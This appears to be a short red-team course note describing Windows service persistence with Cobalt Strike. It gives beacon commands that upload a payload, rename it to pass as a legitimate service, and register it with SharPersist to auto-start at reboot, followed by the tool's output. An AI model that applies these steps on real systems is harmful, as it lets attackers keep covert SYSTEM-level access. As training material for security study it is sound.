
As in [[Windows Services]], there are many Windows services that run as SYSTEM.  Our various means of exploiting services for privilege escalation also act as persistence, but at the cost of breaking the legitimate service.

Instead, we can create our own service which won't impact on existing services.

## 🖊️ via [[Cobalt Strike]]

1) Upload payload and create the service

```
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

[*] INFO: Adding service persistence
[*] INFO: Command: C:\Windows\legit-svc.exe
[*] INFO: Command Args: 
[*] INFO: Service Name: legit-svc

[+] SUCCESS: Service persistence added
```
This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START.  This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection.

![[service.png]]


### Properties
---
📆 created   {{10-02-2024}} 21:09
🏷️ tags: #redteam #crto 

---

